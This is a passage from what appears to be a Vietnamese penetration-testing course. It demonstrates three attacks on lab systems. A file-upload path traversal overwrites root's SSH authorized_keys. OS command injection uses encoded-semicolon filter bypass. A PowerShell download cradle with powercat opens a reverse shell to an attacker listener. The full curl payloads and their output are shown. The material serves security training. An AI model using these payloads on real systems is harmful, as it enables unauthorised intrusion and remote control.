`../../../../../../../root/.ssh/authorized_keys`. Chọn tệp `authorized_keys` trong form upload, **bật intercept** ở Burp trước khi bấm **Upload**. Khi Burp dừng request, chỉnh **`filename`** theo đường dẫn trên rồi **Forward**.

![image.png](image%2021.png)

                        ***Hình 22: Khai thác upload để ghi `authorized_keys` vào home của root***

Hình 22 hiển thị đường dẫn tương đối đã chỉ định. Nếu ta **ghi đè thành công** `authorized_keys` của root, ta có thể dùng **private key** tương ứng để SSH vào hệ thống. Lưu ý: **thường** user `root` **không được phép SSH**. Tuy nhiên, vì ta **không thể** liệt kê người dùng (ví dụ đọc `/etc/passwd`), đây là **phương án duy nhất** hiện có.

Hệ thống đích chạy SSH trên **cổng 2222**. Dùng private key tương ứng để thử kết nối. Ta dùng `-i` (chỉ định private key) và `-p` (cổng).

Ở Learning Unit về **Directory Traversal**, ta từng kết nối cổng 2222 đến `mountaindesserts.com` và máy Kali đã lưu **host key** của máy từ xa. Vì máy đích ở phần này **khác**, SSH sẽ báo lỗi **không xác minh được host key** trước đó. Để tránh lỗi, ta **xóa** tệp `known_hosts` trước khi kết nối (tệp này lưu host key của các phiên SSH trước).

```
kali@kali:~$ rm ~/.ssh/known_hosts

kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

                               *Liệt kê 38 – Dùng SSH key để đăng nhập root thành công qua SSH*

Ta đã đăng nhập **root** thành công nhờ **ghi đè `authorized_keys`**. Khi không thể upload tệp **thực thi**, hãy **sáng tạo** để tìm **vector khác** có thể tận dụng (ví dụ: ghi đè tệp cấu hình, khóa SSH, cron, service, v.v.).

---

# 4. Command Injection

---

**Learning Unit** này bao gồm các **Mục tiêu học tập**:

- Tìm hiểu **command injection** trong ứng dụng web
- Sử dụng **lệnh hệ điều hành** cho OS command injection
- Hiểu cách lợi dụng command injection để **giành quyền truy cập hệ thống**

Trong Learning Unit này, ta sẽ học cách **nhận diện** và **khai thác** lỗ hổng command injection. Ta sẽ tìm hiểu **OS command injection**, cho phép ta **chèn lệnh** vào dòng lệnh của **hệ điều hành** bên dưới một ứng dụng web.

---

## 4.1. OS Command Injection

---

Ứng dụng web thường cần tương tác với hệ điều hành, ví dụ khi một tệp được tạo thông qua cơ chế upload. Ứng dụng web **nên** cung cấp các **API/chức năng chuyên biệt** với **lệnh đã chuẩn bị sẵn** để tương tác hệ thống. Các lệnh được chuẩn bị sẵn sẽ giới hạn tập chức năng và **không cho phép** người dùng thay đổi qua input. Tuy nhiên, việc thiết kế và phát triển các API/chức năng như vậy **tốn nhiều thời gian**.

Đôi khi, ứng dụng phải xử lý rất **nhiều trường hợp khác nhau**, khiến bộ lệnh định nghĩa sẵn trở nên **thiếu linh hoạt**. Trong các trường hợp đó, lập trình viên hay **nhận trực tiếp input** của người dùng rồi **sanitize**. Tức là họ lọc các chuỗi lệnh có thể **thay đổi hành vi** ứng dụng theo hướng độc hại.

Trong phần demo này, ta xem ứng dụng **“Mountain Vaults”** chạy cổng **8000** trên hệ thống **MOUNTAIN**. Mở trình duyệt truy cập: `http://192.168.50.189:8000`.

![image.png](image%2022.png)

                                  ***Hình 23: Nội dung web đã chỉnh sửa và ô nhập lệnh mới***

Phiên bản mới cho phép **clone repo git** bằng cách nhập **lệnh `git clone`** kèm URL. Ví dụ hiển thị đúng như lệnh trên terminal. Ta có thể giả định **hệ điều hành** sẽ thực thi chuỗi này, từ đó có thể **chèn lệnh**. Thử dùng form để clone repo **ExploitDB**.

![image.png](image%2023.png)

                                                       ***Hình 24: Lệnh clone repo ExploitDB***

Sau khi Submit, quá trình clone bắt đầu.

![image.png](image%2024.png)

                                        ***Hình 25: Clone ExploitDB thành công qua ứng dụng web***

Đầu ra cho thấy repo đã được clone thành công.

> Lưu ý: trong môi trường lab, thao tác clone có thể báo lỗi. Để theo kịp hướng dẫn, bạn có thể bỏ qua bước này.
> 

Ngoài ra, **lệnh thực tế** được hiển thị trong output của ứng dụng. Hãy thử **chèn các lệnh tùy ý** như `ipconfig`, `ifconfig`, `hostname` bằng **curl**. Mở **HTTP history** trong **Burp** để xem **cấu trúc POST**. Request cho thấy tham số **`Archive`** được dùng làm lệnh.

![image.png](image%2025.png)

                                               ***Hình 26: Tham số Archive trong request POST***

Hình cho thấy tham số `Archive` chứa **lệnh Git**. Vậy ta có thể dùng `curl` để **tự cung cấp lệnh** cho tham số này: dùng `-X` đổi sang **POST**, và `--data` để gửi **payload**.

```
kali@kali:~$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive

Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
```

                                *Liệt kê 39 – Ứng dụng phát hiện Command Injection với `ipconfig`*

Thử đầu tiên, ứng dụng báo **phát hiện command injection** với `ipconfig`. Ta quay lại từ **input hợp lệ** để tìm bypass. Tiếp theo, thử chỉ truyền **`git`** cho tham số `Archive`:

```
kali@kali:~$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive

An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
...
   push      Update remote refs along with associated objects

'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
```

                                                            *Liệt kê 40 – Nhập `git` làm lệnh*

Đầu ra hiển thị **trang trợ giúp** của `git`, xác nhận rằng ta **không bị giới hạn** chỉ dùng `git clone`. Vì biết `git` chạy được, thử thêm **subcommand `version`**. Nếu chạy được, ta xác nhận có thể chỉ định **bất cứ lệnh git** nào và **thực thi**. Đồng thời phát hiện **hệ điều hành** đang chạy vì `git version` trên Windows sẽ có chuỗi “Windows”, còn Linux thì chỉ phiên bản.

```
kali@kali:~$ curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive

Repository successfully cloned with command: git version and output: git version 2.35.1.windows.2
```

                                           *Liệt kê 40 – Dùng `git version` để nhận diện hệ điều hành*

Đầu ra cho thấy ứng dụng chạy trên **Windows**. Giờ ta thử **dò lọc** bằng phương pháp **thử–sai**. Vì không thể chỉ định **một lệnh khác** trực tiếp, thử **kết hợp** `git` và `ipconfig` bằng **dấu chấm phẩy đã URL-encode** là `%3B`. Dấu `;` dùng được trong nhiều shell (PowerShell/Bash) để **ngăn cách** lệnh. Ngoài ra có thể dùng `&&` (hai lệnh liên tiếp). Với **CMD** trên Windows cũng có thể dùng **một** `&`.

```
kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive

...
'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.

Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.50.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
```

                                *Liệt kê 41 – Truyền `git` và `ipconfig` với dấu chấm phẩy đã mã hóa*

Kết quả cho thấy **cả hai lệnh** được thực thi. Có thể có **bộ lọc** kiểm tra `git` có được gọi hoặc **chỉ cần xuất hiện** trong tham số `Archive`. Tiếp theo, tìm hiểu **môi trường** thực thi lệnh của ta là **PowerShell hay CMD**. Dùng một **snippet tiện lợi** của **PetSerAl**: nó in **“CMD”** hoặc **“PowerShell”** tùy nơi thực thi.

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

                                                   *Liệt kê 42 – Snippet kiểm tra nơi thực thi lệnh*

Tiếp tục **URL-encode** để gửi:

```
kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

...
See 'git help git' for an overview of the system.
PowerShell
```

                                            *Liệt kê 43 – Xác định môi trường thực thi là PowerShell*

Đầu ra có chữ **“PowerShell”** ⇒ lệnh bị chèn **chạy trong PowerShell**.

Giờ ta thử **nâng cấp** thành **truy cập hệ thống**. Ta dùng **Powercat** để tạo **reverse shell**. Powercat là **bản PowerShell của Netcat** có sẵn trên Kali. Mở terminal mới, **copy** Powercat về **home** của user `kali`, rồi **dựng web server Python3** cùng thư mục.

```
kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

                                     *Liệt kê 44 – Phục vụ `powercat.ps1` qua web server Python3*

Mở **tab thứ ba** để bật **Netcat listener** cổng **4444**:

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

                                                    *Liệt kê 45 – Khởi động Netcat lắng nghe 4444*

Khi web server đã phục vụ `powercat.ps1` và listener sẵn sàng, dùng `curl` ở terminal đầu để **chèn lệnh** sau (hai phần ngăn bởi `;`). Phần đầu dùng **download cradle** của PowerShell để **nạp hàm Powercat** từ web server của ta. Phần sau gọi **`powercat`** tạo reverse shell: `-c` chỉ **địa chỉ** kết nối, `-p` **cổng**, `-e` **chương trình** thực thi.

```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

                                                  *Liệt kê 46 – Tải Powercat và tạo reverse shell*

Tiếp tục **URL-encode** lệnh và gửi:

```
kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

                               *Liệt kê 47 – Tải Powercat và tạo reverse shell qua Command Injection*

Sau khi gửi lệnh, terminal thứ hai (web server) sẽ thấy **GET** tới `powercat.ps1`:

```
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.50.189 - - [05/Apr/2022 09:05:48] "GET /powercat.ps1 HTTP/1.1" 200 -
```

                                   *Liệt kê 48 – Web server Python3 hiển thị GET tới `powercat.ps1`*

Listener Netcat (terminal thứ ba) nhận **kết nối reverse shell**:

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents\meteor>
```

                                     *Liệt kê 49 – Reverse shell thành công qua Command Injection*

Ta đã nhận **reverse shell**. Ngoài Powercat, có thể **chèn trực tiếp** một one-liner **PowerShell reverse shell**. Có **nhiều** cách khai thác command injection, phụ thuộc **hệ điều hành**, **cách triển khai** ứng dụng web, và **các cơ chế bảo vệ** hiện diện.

---

# 5. Tổng kết

---

Trong Module này, ta đã bao quát nhiều cuộc tấn công **phổ biến** trên ứng dụng web:

1. **Directory Traversal** – hiển thị nội dung tệp **ngoài web root**.
2. **File Inclusion** – không chỉ hiển thị nội dung tệp mà còn **thực thi tệp** bằng cách include vào **luồng mã** đang chạy của ứng dụng.
3. **File Upload** – lạm dụng upload với **tệp thực thi** và **không thực thi**.
4. **Command Injection** – tận dụng để **truy cập hệ thống nền** của ứng dụng web.

Hiểu các kỹ thuật này **rất hữu ích** cho mọi kiểu đánh giá an ninh. Nếu khai thác trên **ứng dụng công khai Internet**, chúng có thể mang lại **điểm đặt chân ban đầu** (initial foothold) vào mạng mục tiêu. Nếu tìm thấy trong **dịch vụ nội bộ**, chúng có thể cung cấp **vector di chuyển ngang** (lateral movement). Dù bản thân các lỗ hổng **không phụ thuộc** ngôn ngữ/framework cụ thể, **cách khai thác** lại có thể phụ thuộc. Do đó, trước khi khai thác, ta nên dành thời gian **nắm sơ bộ công nghệ web** đang dùng. Với kỹ năng đã học trong Learning Unit này, ta có thể **nhận diện** và **khai thác** một **phổ rộng** ứng dụng web.

---

# 6. Luyện tập

---

## TryHackMe

---

[File Inclusion](https://tryhackme.com/room/fileinc?utm_source=chatgpt.com)

[Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns?utm_source=chatgpt.com)

[Command Injection](https://tryhackme.com/room/oscommandinjection?utm_source=chatgpt.com)

---

## HackTheBox

---

[File Inclusion Course | HTB Academy](https://academy.hackthebox.com/course/preview/file-inclusion?utm_source=chatgpt.com)

---

## PentesterLab

---

[PentesterLab: File Include 01](https://pentesterlab.com/exercises/fileinc-01?utm_source=chatgpt.com)

---

# 7. WriteUp

---

['Labs/Common Web Application Attacks' 카테고리의 글 목록](https://longhd.tistory.com/category/Labs/Common%20Web%20Application%20Attacks)